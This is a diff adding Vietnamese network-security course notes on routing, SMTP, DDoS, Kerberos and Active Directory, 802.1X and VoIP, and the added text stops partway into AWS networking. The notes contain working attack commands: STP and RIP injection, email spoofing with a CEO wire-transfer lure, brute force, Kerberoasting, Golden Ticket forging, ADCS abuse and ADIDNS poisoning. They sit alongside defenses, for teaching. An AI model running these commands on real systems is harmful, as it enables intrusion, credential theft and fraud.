@@ -3336,4 +3336,1837 @@ Tools Documentation:
 
 ---
 
+# PHẦN 11: ROUTING & SWITCHING NÂNG CAO
+
+## 11.1 TCP/IP Model vs OSI Model
+
+```
+OSI Model (7 layers)          TCP/IP Model (4 layers)
+─────────────────────         ──────────────────────
+Application  (7)  ─┐
+Presentation (6)   ├────→    Application
+Session      (5)  ─┘
+Transport    (4)  ──────→    Transport
+Network      (3)  ──────→    Internet
+Data Link    (2)  ─┐
+Physical     (1)  ─┘────→    Network Access
+
+Thực tế, mạng Internet chạy theo TCP/IP model.
+OSI là mô hình lý thuyết để học và tham khảo.
+TCP/IP model thực dụng hơn: gộp Layer 5-6-7 → Application,
+gộp Layer 1-2 → Network Access.
+```
+
+## 11.2 Spanning Tree Protocol (STP) - Chi tiết
+
+### STP là gì?
+Khi switch kết nối với nhau tạo loop → broadcast storm (frame loop vô hạn → sập mạng). STP ngăn loop bằng cách disable một số port.
+
+### Cách STP hoạt động
+
+```
+1. Bầu Root Bridge (switch có Bridge ID nhỏ nhất)
+   Bridge ID = Priority (4 bit, mặc định 32768) + MAC Address
+
+2. Mỗi non-root switch chọn Root Port (port gần root nhất)
+   Tính bằng: path cost (bandwidth) đến root bridge
+
+3. Mỗi segment chọn Designated Port (port forward traffic)
+
+4. Tất cả port khác → Blocking state (không forward)
+
+Port States:
+  Blocking    → Không forward, chỉ nhận BPDU
+  Listening   → Gửi/nhận BPDU, không forward data
+  Learning    → Học MAC address, chưa forward data
+  Forwarding  → Forward data bình thường
+  Disabled    → Admin shutdown
+
+Convergence time: 30-50 giây (STP cổ điển)
+RSTP (Rapid STP - 802.1w): <6 giây
+MSTP (Multiple STP - 802.1s): 1 instance per VLAN group
+```
+
+### STP Attacks
+
+```bash
+# === Root Bridge Takeover ===
+# Nguyên lý: Gửi BPDU với priority thấp hơn → trở thành root bridge
+# → Tất cả traffic đi qua attacker
+
+# Dùng Yersinia
+yersinia stp -attack 4 -interface eth0    # Become root bridge
+
+# Dùng Scapy
+from scapy.all import *
+# Gửi BPDU với priority = 0 (thấp nhất)
+frame = Dot3(dst="01:80:c2:00:00:00", src="AA:BB:CC:DD:EE:FF") / \
+        LLC(dsap=0x42, ssap=0x42, ctrl=3) / \
+        STP(bpdutype=0, rootmac="AA:BB:CC:DD:EE:FF", rootid=0,
+            bridgemac="AA:BB:CC:DD:EE:FF", bridgeid=0)
+sendp(frame, iface="eth0", loop=1, inter=2)
+
+# === BPDU Flood ===
+# Gửi hàng ngàn BPDU → switch overload
+yersinia stp -attack 2 -interface eth0
+
+# === Phòng chống ===
+# BPDU Guard: Nếu nhận BPDU trên access port → shutdown port
+# (config)# interface range gi0/1-24
+# (config-if-range)# spanning-tree bpduguard enable
+
+# Root Guard: Không cho port trở thành root port
+# (config-if)# spanning-tree guard root
+
+# PortFast: Skip STP cho access port (không chờ 30s)
+# (config-if)# spanning-tree portfast
+```
+
+## 11.3 Routing Protocols & Attacks
+
+### Distance Vector vs Link State
+
+```
+Distance Vector (RIP, EIGRP):
+- Mỗi router chỉ biết neighbor trực tiếp
+- Gửi routing table cho neighbor định kỳ
+- Chậm converge, dễ loop
+- "Đường đi theo lời kể" - tin neighbor
+
+Link State (OSPF, IS-IS):
+- Mỗi router biết TOÀN BỘ topology
+- Gửi Link State Advertisement (LSA) cho tất cả
+- Nhanh converge
+- "Tự tính đường đi" - dùng Dijkstra algorithm
+
+Path Vector (BGP):
+- Dùng cho inter-AS routing (giữa các ISP)
+- Gửi full path (AS path) → tránh loop
+- Policy-based routing
+```
+
+### RIP (Routing Information Protocol)
+
+```
+Version: RIPv1 (classful, broadcast), RIPv2 (classless, multicast 224.0.0.9)
+Metric: Hop count (max 15, 16 = unreachable)
+Timer: Update 30s, Invalid 180s, Flush 240s
+Port: UDP 520
+
+# Tấn công RIP: Route Injection
+# Gửi RIP update giả → router thêm route sai → traffic đi lệch
+from scapy.all import *
+rip = IP(dst="224.0.0.9") / UDP(sport=520, dport=520) / \
+      RIP() / RIPEntry(AF=2, addr="10.0.0.0", mask="255.0.0.0",
+                       nexthop="192.168.1.200", metric=1)
+send(rip)
+
+# Phòng chống: RIP authentication (MD5)
+```
+
+### OSPF (Open Shortest Path First)
+
+```
+Areas: Backbone (Area 0), Stub, NSSA
+Multicast: 224.0.0.5 (All OSPF), 224.0.0.6 (DR/BDR)
+Protocol: IP Protocol 89
+Metric: Cost = Reference BW / Interface BW
+
+Router types:
+- Internal Router: Tất cả interfaces trong 1 area
+- ABR (Area Border Router): Nối 2+ areas
+- ASBR (AS Boundary Router): Nối OSPF với routing protocol khác
+- DR (Designated Router): Giảm adjacency trong multi-access network
+
+# OSPF Attacks:
+# 1. LSA Injection: Inject fake LSA → thay đổi routing
+# 2. Phantom Router: Join OSPF area, trở thành DR
+# 3. MaxAge LSA: Gửi LSA với MaxAge → route bị xóa
+
+# Dùng Loki framework cho OSPF attacks
+# Hoặc FRRouting để join OSPF domain
+
+# Phòng chống:
+# OSPF authentication (MD5 hoặc SHA)
+# (config-router)# area 0 authentication message-digest
+# (config-if)# ip ospf message-digest-key 1 md5 SECRET_KEY
+
+# TTL Security (chỉ nhận packet TTL=255 → phải từ neighbor trực tiếp)
+# (config-router)# ttl-security all-interfaces hops 1
+```
+
+### BGP (Border Gateway Protocol) - Internet Backbone
+
+```
+Type: Path Vector, TCP port 179
+Dùng cho: Routing giữa các AS (Autonomous System) trên Internet
+Mỗi ISP, tổ chức lớn = 1 AS, có ASN (AS Number)
+
+eBGP: Giữa AS khác nhau
+iBGP: Trong cùng AS
+
+BGP Decision Process (thứ tự ưu tiên):
+1. Highest Weight (Cisco proprietary)
+2. Highest Local Preference
+3. Locally originated routes
+4. Shortest AS Path
+5. Lowest Origin type (IGP < EGP < Incomplete)
+6. Lowest MED
+7. eBGP over iBGP
+8. Lowest IGP metric to next-hop
+9. Oldest route
+10. Lowest Router ID
+```
+
+### BGP Hijacking
+
+```
+Nguyên lý: BGP dựa trên TRUST. Khi AS announce prefix, neighbor tin.
+Attacker announce prefix của victim → traffic bị redirect.
+
+Ví dụ thực tế:
+- 2018: MyEtherWallet bị BGP hijack → redirect DNS → steal crypto
+- 2008: Pakistan Telecom hijack YouTube prefix (accident)
+
+Loại BGP Hijack:
+1. Prefix Hijack: Announce CÙNG prefix → traffic bị chia
+2. Sub-prefix Hijack: Announce prefix CỤ THỂ HƠN (ví dụ /25 thay vì /24)
+   → More specific = preferred → chiếm hết traffic
+3. AS Path Manipulation: Prepend AS path giả
+
+# Monitoring:
+# BGPStream: https://bgpstream.com
+# RIPE RIS: https://ris.ripe.net
+# BGP Toolkit: https://bgp.he.net
+
+# Phòng chống:
+# RPKI (Resource Public Key Infrastructure): Validate route origin
+# ROA (Route Origin Authorization): Signed object saying "AS X is authorized to announce prefix Y"
+# IRR (Internet Routing Registry): Database of routing policies
+# BGPSec: Crypto validation of entire AS path (chưa deploy rộng)
+```
+
+### EIGRP (Cisco proprietary)
+
+```
+Protocol: IP Protocol 88
+Metric: Composite (Bandwidth, Delay, Reliability, Load)
+Multicast: 224.0.0.10
+Dùng DUAL algorithm
+
+# EIGRP Attack: Neighborhip injection
+# Join EIGRP domain → inject routes
+# Tool: Loki, FRRouting, Scapy
+
+# Phòng chống: EIGRP authentication (MD5/SHA)
+```
+
+## 11.4 Network Topology Design
+
+```
+=== Common Topologies ===
+
+Star:
+  Tất cả node kết nối vào 1 switch trung tâm
+  Pros: Dễ quản lý, lỗi 1 node không ảnh hưởng khác
+  Cons: Single point of failure (switch trung tâm)
+
+Spine-Leaf (Modern Data Center):
+  Leaf switches: Kết nối servers
+  Spine switches: Kết nối tất cả leaf switches
+  Mỗi leaf kết nối TẤT CẢ spine (full mesh)
+  Pros: Predictable latency, horizontal scaling
+  Cons: Nhiều cáp, chi phí cao
+
+  ┌────────┐  ┌────────┐  ┌────────┐
+  │ Spine1 │  │ Spine2 │  │ Spine3 │
+  └─┬──┬─┬─┘  └─┬──┬─┬─┘  └─┬──┬─┬─┘
+    │  │  │      │  │  │      │  │  │
+    │  │  └──────┘  │  └──────┘  │  │
+    │  └─────┐ ┌────┘  ┌─────┘  │  │
+  ┌─┴──┴─────┴─┴───────┴────────┴──┴─┐
+  │ Leaf1 │  │ Leaf2 │  │ Leaf3 │     │
+  └───┬───┘  └───┬───┘  └───┬───┘
+   Servers    Servers    Servers
+
+Three-Tier (Enterprise Classic):
+  Core → Distribution → Access
+  Core: High-speed backbone
+  Distribution: Policy, filtering, inter-VLAN routing
+  Access: End-user connectivity
+
+DMZ Architecture:
+  Internet → Firewall → DMZ (web servers, mail servers)
+                       → Internal Network (workstations, DB)
+  DMZ = Demilitarized Zone: vùng đệm giữa Internet và Internal
+```
+
+## 11.5 Load Balancing
+
+```
+Layer 4 (Transport) Load Balancer:
+  Dựa trên IP + Port
+  Nhanh, ít overhead
+  Ví dụ: HAProxy (TCP mode), LVS, F5
+
+Layer 7 (Application) Load Balancer:
+  Dựa trên nội dung HTTP (URL, header, cookie)
+  Có thể: SSL termination, caching, WAF
+  Ví dụ: HAProxy (HTTP mode), Nginx, AWS ALB, Traefik
+
+Algorithms:
+  Round Robin        → Lần lượt từng server
+  Weighted Round Robin → Server mạnh nhận nhiều hơn
+  Least Connections  → Server ít connection nhất
+  IP Hash            → Cùng client IP → cùng server (session persistence)
+  Random             → Chọn ngẫu nhiên
+
+# HAProxy config ví dụ
+frontend http_front
+    bind *:80
+    default_backend http_back
+
+backend http_back
+    balance roundrobin
+    server web1 192.168.1.10:80 check
+    server web2 192.168.1.11:80 check
+    server web3 192.168.1.12:80 check
+
+# Security góc nhìn:
+# Load balancer là single point of failure nếu không HA
+# Health check bypass: respond 200 nhưng app lỗi
+# Session persistence → session fixation risk
+# X-Forwarded-For header spoofing
+```
+
+---
+
+# PHẦN 12: EMAIL SECURITY & SMTP ATTACKS
+
+## 12.1 SMTP (Simple Mail Transfer Protocol) - Port 25/465/587
+
+### SMTP hoạt động thế nào
+
+```
+Sender → SMTP Client → SMTP Server (MTA) ──→ Recipient MTA → POP3/IMAP → Recipient
+
+SMTP Session:
+┌──────────────────────────────────────────┐
+│ Client: HELO mail.attacker.com           │
+│ Server: 250 Hello                        │
+│ Client: MAIL FROM:<admin@target.com>     │
+│ Server: 250 OK                           │
+│ Client: RCPT TO:<victim@target.com>      │
+│ Server: 250 OK                           │
+│ Client: DATA                             │
+│ Server: 354 Start mail input             │
+│ Client: Subject: Important               │
+│         From: admin@target.com           │
+│         To: victim@target.com            │
+│                                          │
+│         This is the email body.           │
+│         .                                │
+│ Server: 250 OK                           │
+│ Client: QUIT                             │
+└──────────────────────────────────────────┘
+
+Ports:
+  25  → SMTP (server-to-server relay)
+  465 → SMTPS (implicit TLS, deprecated)
+  587 → Submission (client-to-server, STARTTLS)
+```
+
+### SMTP Attacks
+
+```bash
+# === Email Spoofing ===
+# SMTP không verify sender identity (MAIL FROM có thể giả)
+
+# Dùng swaks (Swiss Army Knife for SMTP)
+swaks --to victim@target.com \
+      --from ceo@target.com \
+      --server mail.target.com \
+      --header "Subject: Urgent - Wire Transfer" \
+      --body "Please transfer $50,000 to account..."
+
+# Dùng sendemail
+sendemail -f ceo@target.com -t victim@target.com \
+          -u "Urgent" -m "Body text" \
+          -s mail.target.com
+
+# Kiểm tra SMTP open relay
+nmap --script smtp-open-relay -p 25 mail.target.com
+
+# SMTP user enumeration
+# VRFY command (verify user exists)
+nmap --script smtp-enum-users -p 25 mail.target.com
+smtp-user-enum -M VRFY -U users.txt -t mail.target.com
+
+# SMTP NTLM authentication capture
+# Dùng Responder hoặc Metasploit
+```
+
+### Email Security Headers (SPF, DKIM, DMARC)
+
+```
+=== SPF (Sender Policy Framework) ===
+DNS TXT record chỉ định server nào được phép gửi email cho domain.
+
+target.com TXT "v=spf1 ip4:203.0.113.0/24 include:_spf.google.com -all"
+
+v=spf1           → SPF version 1
+ip4:203.0.113.0  → Cho phép dải IP này gửi email
+include:         → Cho phép SPF record của domain khác
+-all             → Reject tất cả server không nằm trong list
+~all             → Soft fail (đánh dấu nhưng vẫn nhận)
+?all             → Neutral (không check)
+
+# Kiểm tra SPF
+dig target.com TXT | grep spf
+
+=== DKIM (DomainKeys Identified Mail) ===
+Server ký email bằng private key, receiver verify bằng public key trong DNS.
+
+DNS record: selector._domainkey.target.com TXT "v=DKIM1; k=rsa; p=PUBLIC_KEY..."
+
+# Kiểm tra DKIM
+dig selector._domainkey.target.com TXT
+
+=== DMARC (Domain-based Message Authentication) ===
+Policy nói receiver làm gì khi email fail SPF/DKIM.
+
+_dmarc.target.com TXT "v=DMARC1; p=reject; rua=mailto:dmarc@target.com"
+
+p=none     → Không làm gì (chỉ report)
+p=quarantine → Đưa vào spam
+p=reject   → Reject email
+rua=       → Gửi aggregate report đến đâu
+
+# Kiểm tra DMARC
+dig _dmarc.target.com TXT
+
+# Kiểm tra toàn bộ email security
+# https://mxtoolbox.com/
+```
+
+## 12.2 POP3 / IMAP
+
+```
+POP3 (Port 110/995):
+  Download email về client, XÓA trên server
+  Đơn giản, offline access
+  POP3S = POP3 + TLS (port 995)
+
+IMAP (Port 143/993):
+  Đồng bộ email giữa client và server
+  Email ở trên server
+  IMAPS = IMAP + TLS (port 993)
+
+# Brute force
+hydra -l user@target.com -P passwords.txt pop3://mail.target.com
+hydra -l user@target.com -P passwords.txt imap://mail.target.com
+
+# Đọc email sau khi có credentials
+# POP3 manual
+nc mail.target.com 110
+USER admin@target.com
+PASS password
+LIST
+RETR 1
+
+# IMAP manual
+nc mail.target.com 143
+a1 LOGIN admin@target.com password
+a2 LIST "" "*"
+a3 SELECT INBOX
+a4 FETCH 1 BODY[]
+```
+
+---
+
+# PHẦN 13: DDoS - HIỂU VÀ PHÒNG CHỐNG
+
+## 13.1 DDoS Taxonomy
+
+```
+┌─────────────────────────────────────────────────────────────┐
+│                     DDoS Attack Types                       │
+├──────────────────┬──────────────────┬───────────────────────┤
+│ Volumetric       │ Protocol         │ Application Layer     │
+│ (Layer 3/4)      │ (Layer 3/4)      │ (Layer 7)             │
+├──────────────────┼──────────────────┼───────────────────────┤
+│ UDP Flood        │ SYN Flood        │ HTTP Flood            │
+│ DNS Amplification│ ACK Flood        │ Slowloris             │
+│ NTP Amplification│ Ping of Death    │ RUDY (R-U-Dead-Yet)   │
+│ SSDP Amplification│ Smurf Attack   │ DNS Water Torture     │
+│ Memcached Ampl.  │ TCP Fragment     │ WordPress Pingback    │
+│ CHARGEN          │ IP Null Attack   │ API Abuse             │
+└──────────────────┴──────────────────┴───────────────────────┘
+
+Volumetric: Saturate bandwidth (Gbps)
+Protocol: Exhaust server/firewall state tables (PPS)
+Application: Exhaust application resources (RPS)
+```
+
+## 13.2 Amplification Attacks (Chi tiết)
+
+```
+Nguyên lý: Gửi request nhỏ với source IP giả (victim IP)
+→ Server trả response LỚN về victim IP
+
+Protocol    Amplification Factor    Port
+──────────  ────────────────────    ────
+Memcached   51,000x                 11211
+NTP         556x                    123
+DNS         28-54x                  53
+SSDP        30x                     1900
+CHARGEN     358x                    19
+SNMP        6x                      161
+LDAP        46-55x                  389
+
+# DNS Amplification
+# Request nhỏ (60 bytes) → Response lớn (3000+ bytes)
+# Spoofed source IP = victim
+dig ANY google.com @open-resolver     # Response ~3KB
+
+# NTP Amplification
+# monlist command trả về list 600 clients gần nhất
+ntpdc -n -c monlist open-ntp-server   # Response ~100x request
+
+# Memcached Amplification (51,000x!)
+# stats command hoặc get large_key
+# 2018: GitHub bị 1.35 Tbps DDoS qua Memcached
+```
+
+## 13.3 Application Layer DDoS
+
+```bash
+# === Slowloris ===
+# Nguyên lý: Mở nhiều connection, gửi HTTP header CHẬM (không bao giờ hoàn thành)
+# → Server giữ connection open → hết connection pool
+
+# Cách hoạt động:
+# 1. Mở connection
+# 2. Gửi: GET / HTTP/1.1\r\n
+# 3. Gửi: X-Header: value\r\n    (cứ mỗi 15 giây gửi 1 header)
+# 4. KHÔNG BAO GIỜ gửi \r\n cuối cùng (kết thúc header)
+# → Server chờ mãi
+
+# Tool (chỉ dùng trong lab):
+# slowloris.py
+# slowhttptest
+
+# === HTTP Flood ===
+# Gửi hàng triệu HTTP GET/POST request hợp lệ
+# Khó phân biệt với traffic thật
+
+# === DNS Water Torture ===
+# Gửi query cho random subdomain: abc123.target.com
+# DNS server phải resolve (cache miss) → overload authoritative DNS
+
+# === RUDY (R-U-Dead-Yet) ===
+# POST request với Content-Length lớn
+# Gửi body 1 byte mỗi 10 giây → connection mở mãi
+```
+
+## 13.4 DDoS Mitigation
+
+```
+1. Network Level:
+   - Anycast: Phân tán traffic đến nhiều PoP (Point of Presence)
+   - Blackhole Routing: Drop traffic đến IP bị tấn công (last resort)
+   - Rate Limiting: Giới hạn request/second per IP
+   - ACL: Block known bad IPs
+   - BGP Flowspec: Inject firewall rules qua BGP
+
+2. Scrubbing Services:
+   - Cloudflare, AWS Shield, Akamai Prolexic
+   - Traffic đi qua scrubbing center → lọc → forward clean traffic
+   - Hoạt động: DNS trỏ về scrubbing center thay vì origin
+
+3. Application Level:
+   - WAF rules
+   - CAPTCHA cho suspicious traffic
+   - JavaScript challenge (bot không chạy JS)
+   - Rate limiting per endpoint
+   - Connection timeout giảm
+
+4. Infrastructure:
+   - Over-provisioning bandwidth
+   - CDN (Content Delivery Network) phân tán load
+   - Load balancer với health check
+   - Auto-scaling (cloud)
+
+5. Anti-Slowloris:
+   - Apache: mod_reqtimeout, mod_qos
+   - Nginx: mặc định resistant (event-based, không giữ thread per connection)
+   - HAProxy: timeout http-request 5s
+```
+
+## 13.5 Botnet Architecture
+
+```
+=== Centralized C2 ===
+                   ┌──────┐
+                   │  C2  │
+                   └──┬───┘
+           ┌──────┬──┴──┬──────┐
+           │      │     │      │
+         Bot1   Bot2  Bot3   Bot4
+Ưu: Dễ quản lý     Nhược: Single point of failure
+
+=== P2P Botnet ===
+         Bot1 ←→ Bot2
+           ↕        ↕
+         Bot3 ←→ Bot4
+Ưu: Resilient, khó takedown     Nhược: Chậm command propagation
+
+=== Domain Generation Algorithm (DGA) ===
+Bot tự generate random domain hàng ngày
+Bot master register domain trước → C2
+Law enforcement khó block vì domain thay đổi liên tục
+Ví dụ: Conficker tạo 50,000 domain/ngày
+
+=== Fast Flux ===
+Domain resolve đến nhiều IP khác nhau (bot IPs)
+IP thay đổi liên tục (TTL rất thấp)
+→ Khó trace back đến real C2
+```
+
+---
+
+# PHẦN 14: KERBEROS & ACTIVE DIRECTORY NETWORKING
+
+## 14.1 Kerberos Protocol Deep Dive
+
+### Kerberos Components
+
+```
+KDC (Key Distribution Center) = chạy trên Domain Controller
+├── AS (Authentication Service): Xác thực user, cấp TGT
+└── TGS (Ticket Granting Service): Cấp service ticket
+
+TGT (Ticket Granting Ticket): "Giấy thông hành" chứng minh user đã xác thực
+Service Ticket (TGS): "Vé" truy cập service cụ thể
+```
+
+### Kerberos Authentication Flow
+
+```
+┌────────┐         ┌──────┐         ┌─────────┐
+│ Client │         │  KDC │         │ Service │
+└───┬────┘         └──┬───┘         └────┬────┘
+    │                  │                  │
+    │ 1. AS-REQ        │                  │
+    │ (username,       │                  │
+    │  timestamp       │                  │
+    │  encrypted with  │                  │
+    │  user's hash)    │                  │
+    │─────────────────>│                  │
+    │                  │                  │
+    │ 2. AS-REP        │                  │
+    │ (TGT encrypted   │                  │
+    │  with krbtgt hash,│                 │
+    │  session key      │                 │
+    │  encrypted with   │                 │
+    │  user's hash)    │                  │
+    │<─────────────────│                  │
+    │                  │                  │
+    │ 3. TGS-REQ       │                  │
+    │ (TGT + SPN of    │                  │
+    │  target service) │                  │
+    │─────────────────>│                  │
+    │                  │                  │
+    │ 4. TGS-REP       │                  │
+    │ (Service Ticket   │                 │
+    │  encrypted with   │                 │
+    │  service's hash) │                  │
+    │<─────────────────│                  │
+    │                  │                  │
+    │ 5. AP-REQ (Service Ticket)          │
+    │────────────────────────────────────>│
+    │                  │                  │
+    │ 6. AP-REP (Optional mutual auth)    │
+    │<────────────────────────────────────│
+```
+
+### Kerberos Attacks
+
+```bash
+# === Kerberoasting ===
+# Nguyên lý: Service Ticket (TGS) encrypted bằng service account password hash
+# Bất kỳ domain user nào cũng xin được TGS cho bất kỳ SPN
+# → Request TGS → Offline crack hash
+
+# Tìm SPN accounts
+GetUserSPNs.py domain/user:password -dc-ip 192.168.1.1
+
+# Request TGS và crack
+GetUserSPNs.py domain/user:password -dc-ip 192.168.1.1 -request -outputfile hashes.txt
+hashcat -m 13100 hashes.txt wordlist.txt
+
+# Với Rubeus (trên Windows)
+Rubeus.exe kerberoast /outfile:hashes.txt
+
+# === AS-REP Roasting ===
+# Nguyên lý: Account có "Do not require Kerberos pre-authentication" enabled
+# → Ai cũng request được AS-REP → chứa hash encrypted với user password → crack
+
+# Tìm AS-REP roastable accounts
+GetNPUsers.py domain/ -dc-ip 192.168.1.1 -usersfile users.txt -no-pass -outputfile asrep.txt
+hashcat -m 18200 asrep.txt wordlist.txt
+
+# === Golden Ticket ===
+# Nguyên lý: Nếu có krbtgt hash → tạo TGT tùy ý (bất kỳ user, bất kỳ group)
+# → Truy cập MỌI THỨ trong domain
+
+# Lấy krbtgt hash (cần Domain Admin):
+mimikatz> lsadump::dcsync /user:krbtgt
+
+# Tạo Golden Ticket:
+mimikatz> kerberos::golden /user:Administrator /domain:target.com \
+  /sid:S-1-5-21-... /krbtgt:hash /ptt
+
+# Với ticketer (Impacket)
+ticketer.py -nthash krbtgt_hash -domain-sid S-1-5-21-... \
+  -domain target.com Administrator
+
+# === Silver Ticket ===
+# Giống Golden nhưng cho 1 service cụ thể
+# Chỉ cần service account hash (không cần krbtgt)
+mimikatz> kerberos::golden /user:Administrator /domain:target.com \
+  /sid:S-1-5-21-... /target:server.target.com \
+  /service:cifs /rc4:service_hash /ptt
+
+# === Unconstrained Delegation ===
+# Server được phép delegate TGT của user cho bất kỳ service nào
+# Compromise server này → steal TGT của bất kỳ ai connect đến
+
+# Tìm unconstrained delegation
+Get-ADComputer -Filter {TrustedForDelegation -eq $True}
+
+# === Constrained Delegation Abuse ===
+# S4U2Self + S4U2Proxy → impersonate bất kỳ user
+getST.py -spn cifs/target.com -impersonate Administrator \
+  domain/service_account:password -dc-ip 192.168.1.1
+
+# === Resource-Based Constrained Delegation (RBCD) ===
+# Modify msDS-AllowedToActOnBehalfOfOtherIdentity attribute
+rbcd.py -delegate-from attacker$ -delegate-to target$ \
+  -action write domain/user:password
+getST.py -spn cifs/target.com -impersonate Administrator \
+  domain/attacker$:password
+```
+
+## 14.2 AD Certificate Services (ADCS) Attacks
+
+```bash
+# === ESC1: Misconfigured Certificate Template ===
+# Template cho phép: enrollee supplies subject (SAN)
+# → Request cert cho Domain Admin!
+certipy find -u user@target.com -p password -dc-ip 192.168.1.1 -vulnerable
+
+certipy req -u user@target.com -p password -ca CA-NAME \
+  -template VulnTemplate -upn administrator@target.com
+
+certipy auth -pfx administrator.pfx
+
+# === ESC8: NTLM Relay to ADCS HTTP Enrollment ===
+# Relay NTLM auth đến ADCS web enrollment → get cert as victim
+ntlmrelayx.py -t http://ca-server/certsrv/certfnsh.asp \
+  -smb2support --adcs --template DomainController
+
+# Nhiều ESC variants (ESC1-ESC13+)
+# Dùng Certipy hoặc Certify để tìm và exploit
+```
+
+## 14.3 ADIDNS Poisoning
+
+```bash
+# Nguyên lý: AD-Integrated DNS cho phép authenticated users tạo record
+# → Tạo wildcard record (*.domain) → capture traffic
+
+# Dùng Inveigh hoặc dnstool.py
+python3 dnstool.py -u 'domain\user' -p password -a add \
+  -r '*.target.com' -d attacker-ip dc-ip
+```
+
+---
+
+# PHẦN 15: AAA & NETWORK ACCESS CONTROL
+
+## 15.1 RADIUS (Remote Authentication Dial-In User Service)
+
+```
+Port: UDP 1812 (Authentication), 1813 (Accounting)
+Dùng cho: Wi-Fi 802.1X, VPN authentication, network device login
+
+Flow:
+Client → NAS (Network Access Server) → RADIUS Server → AD/LDAP
+
+┌────────┐     ┌──────┐     ┌────────┐     ┌──────┐
+│ Client │ ──→ │ NAS  │ ──→ │ RADIUS │ ──→ │ AD/  │
+│        │     │(AP/  │     │ Server │     │ LDAP │
+│        │     │Switch│     │(FreeRADIUS)│  │      │
+└────────┘     └──────┘     └────────┘     └──────┘
+
+RADIUS Packets:
+  Access-Request    → NAS gửi credentials lên RADIUS
+  Access-Accept     → RADIUS cho phép
+  Access-Reject     → RADIUS từ chối
+  Access-Challenge  → RADIUS yêu cầu thêm thông tin
+  Accounting-Request → Log session (start/stop/interim)
+
+# FreeRADIUS setup
+apt install freeradius
+# Config: /etc/freeradius/3.0/
+# clients.conf: Định nghĩa NAS devices
+# users: User database
+# radiusd.conf: Main config
+
+# Testing
+radtest user password radius-server 0 shared_secret
+
+# Security issues:
+# Shared secret yếu → brute force
+# RADIUS traffic (ngoài password) KHÔNG encrypted
+# → Dùng RADSEC (RADIUS over TLS) cho transit security
+```
+
+## 15.2 TACACS+ (Terminal Access Controller Access-Control System Plus)
+
+```
+Port: TCP 49
+Dùng cho: Network device authentication (Cisco, Juniper)
+Khác RADIUS: Encrypt TOÀN BỘ packet (không chỉ password)
+Tách biệt Authentication, Authorization, Accounting (AAA)
+
+So sánh RADIUS vs TACACS+:
+┌──────────────┬───────────────┬────────────────┐
+│ Feature      │ RADIUS        │ TACACS+        │
+├──────────────┼───────────────┼────────────────┤
+│ Transport    │ UDP           │ TCP            │
+│ Encryption   │ Password only │ Full packet    │
+│ AAA          │ Combined      │ Separate       │
+│ Use case     │ Network access│ Device admin   │
+│ Standard     │ Open          │ Cisco          │
+└──────────────┴───────────────┴────────────────┘
+```
+
+## 15.3 802.1X (Port-Based Network Access Control)
+
+```
+Components:
+  Supplicant: Client muốn truy cập mạng (laptop/phone)
+  Authenticator: Switch/AP kiểm soát port
+  Authentication Server: RADIUS server
+
+Flow:
+┌──────────┐     ┌──────────────┐     ┌────────┐
+│Supplicant│ ──→ │Authenticator │ ──→ │RADIUS  │
+│(Client)  │ EAP │(Switch/AP)   │RADIUS│Server  │
+└──────────┘     └──────────────┘     └────────┘
+
+1. Client kết nối → port ở trạng thái "unauthorized"
+2. Switch gửi EAP-Request/Identity
+3. Client trả EAP-Response/Identity (username)
+4. Switch forward lên RADIUS
+5. RADIUS challenge → client authenticate
+6. RADIUS Accept → switch chuyển port sang "authorized"
+
+EAP Methods:
+  EAP-TLS:      Certificate-based (mạnh nhất, cần PKI)
+  PEAP:         Server cert + username/password (phổ biến nhất)
+  EAP-TTLS:     Giống PEAP nhưng linh hoạt hơn
+  EAP-FAST:     Cisco, dùng PAC (Protected Access Credential)
+
+# 802.1X Bypass Techniques:
+# 1. MAC Bypass (MAB): Nếu device không hỗ trợ 802.1X
+#    → Switch fallback cho phép dựa trên MAC → Spoof MAC
+# 2. NAC bypass: Clone MAC + IP của authorized device
+# 3. Hub trick: Cắm hub giữa authorized device và switch
+#    → Hai device share port
+# 4. VLAN hopping sau khi authenticate
+# 5. EAP downgrade attack
+```
+
+## 15.4 NAC (Network Access Control) Solutions
+
+```
+Cisco ISE, Aruba ClearPass, FortiNAC, PacketFence (open source)
+
+NAC checks:
+  - Identity: Ai?
+  - Posture: Antivirus updated? OS patched? Firewall on?
+  - Compliance: Corporate policy compliance
+  
+Actions:
+  - Allow full access
+  - Quarantine VLAN (chỉ cho patch/update)
+  - Deny access
+  - Guest VLAN
+
+# NAC Bypass:
+# Spoof compliant device's MAC + IP
+# Modify HTTP User-Agent để bypass posture check
+# VLAN manipulation sau khi vào quarantine VLAN
+```
+
+---
+
+# PHẦN 16: VoIP / SIP ATTACKS
+
+## 16.1 SIP (Session Initiation Protocol)
+
+```
+Port: UDP/TCP 5060 (SIP), 5061 (SIPS/TLS)
+RTP: UDP 10000-20000 (Real-time Transport Protocol - actual voice)
+
+SIP Methods:
+  INVITE    → Start call
+  ACK       → Confirm
+  BYE       → End call
+  REGISTER  → Register with SIP server
+  CANCEL    → Cancel pending request
+  OPTIONS   → Query capabilities
+
+SIP Call Flow:
+  Caller → INVITE → SIP Proxy → INVITE → Callee
+  Callee → 180 Ringing → SIP Proxy → 180 Ringing → Caller
+  Callee → 200 OK → SIP Proxy → 200 OK → Caller
+  Caller → ACK → Callee
+  [RTP Media Stream directly between Caller ↔ Callee]
+  Caller → BYE → Callee
+  Callee → 200 OK → Caller
+```
+
+## 16.2 VoIP Attacks
+
+```bash
+# === SIP Enumeration ===
+svmap 192.168.1.0/24                           # Find SIP devices
+svwar -m INVITE -e 100-999 192.168.1.100       # Enumerate extensions
+
+# === SIP Brute Force ===
+sipvicious: svcrack -u 100 -d wordlist.txt 192.168.1.100
+
+# === VoIP Eavesdropping ===
+# MITM (ARP spoof) → capture RTP → decode audio
+# Wireshark: Telephony → VoIP Calls → Play Streams
+
+# === Toll Fraud ===
+# Register giả lên SIP server → gọi international
+
+# === SRTP (Secure RTP) ===
+# Encrypted voice → không nghe lén được
+# ZRTP: End-to-end encryption cho VoIP
+
+# === SIP specific tools ===
+# SIPVicious Suite: svmap, svwar, svcrack
+# VoIPER: Fuzzer cho SIP
+# Owasp VoIP Security: Testing methodology
+```
+
+---
+
+# PHẦN 17: CLOUD NETWORKING & SECURITY
+
+## 17.1 AWS Networking
+
+```
+VPC (Virtual Private Cloud):
+  CIDR block: 10.0.0.0/16 (ví dụ)
+  ├── Public Subnet:  10.0.1.0/24 (có Internet Gateway)
+  ├── Private Subnet: 10.0.2.0/24 (không có IGW)
+  └── Database Subnet: 10.0.3.0/24
+
+Components:
+  Internet Gateway (IGW): Kết nối VPC ra Internet
+  NAT Gateway: Cho private subnet ra Internet (outbound only)
+  Route Table: Routing rules cho mỗi subnet
+  Security Group: Stateful firewall per instance (allow rules only)
